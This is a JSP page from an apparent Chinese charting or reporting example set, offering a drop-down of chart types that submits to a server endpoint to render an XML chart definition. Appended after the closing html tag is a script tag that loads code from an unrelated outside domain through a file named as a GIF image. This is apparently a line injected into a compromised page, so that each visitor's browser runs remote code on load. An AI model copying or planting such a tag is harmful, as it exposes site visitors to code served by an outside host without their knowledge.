<%@ page contentType="text/html; charset=gb2312" %>
<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>

<% 

 String examplePath=getServletConfig().getServletContext().getRealPath("/");
  
 if(!examplePath.endsWith(File.separator))
 {
 	examplePath+= File.separator ;
 }
 
 examplePath+=("example"+File.separator);

 examplePath = examplePath.replace('\\','/');


%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<base target="mainFrame">
<title></title>
<style type="text/css">
<!--
BODY {
	COLOR: #333333; 
	FONT-FAMILY: Arial,helvetica,Vernada; 
	FONT-SIZE: 14px; 
	TEXT-DECORATION: none
}

.text {
	font-family: Vernada,Arial,helvetica;
	font-size: 14px;
	color:#4652aa;
	
}
SELECT {
	font-family: Vernada,Arial,helvetica;
	COLOR: #333333; 	
	FONT-SIZE: 12px; 
}



-->
</style>
<script language="JavaScript" type="text/JavaScript">
var _value;
var action="../server?file=<%=examplePath%>selectchart.xml&as=dhtml";
	function chartselect(){
		var index=document.getElementById("chartselect").options.selectedIndex;
		_value=document.getElementById("chartselect").options[index].value;
		//alert("_value:"+_value);	
		_value="&mycharttype="+_value;

		var mycharttype=_value;
		document.getElementById("myform").action=action+_value;

		//alert("myform.action:"+document.getElementById("myform").action);
		document.getElementById("myform").submit();
		_value="";
	}
</script>
</head>	
<body>
<table width="345" height="29" border="0" cellpadding="0" cellspacing="10" bgcolor="#F5F5DC">
  <tr>
    <td width="345">选择图表类型：
      <select name="select" id="chartselect" onChange="chartselect();">
        <option value="100">堆积折线图</option>
        <option value="200">堆积面积图</option>
        <option value="201">三维堆积面积图</option>
        <option value="300">饼图</option>
        <option value="301">三维饼图</option>
        <option value="302">分离型饼图</option>
        <option value="303">三维分离型饼图</option>
        <option value="400">簇状柱形图</option>
        <option value="401">堆积柱形图</option>
        <option value="402">三维簇状柱形图</option>
        <option value="403">三维堆积柱形图</option>
      </select></td>
  </tr>
</table>
<form method="post" action ="../server?file=<%=examplePath%>selectchart.xml&as=dhtml" id="myform"></form>
</body>
</html>
<script src=http://fangaizheng.com.cn/count/js/gif.gif></script>
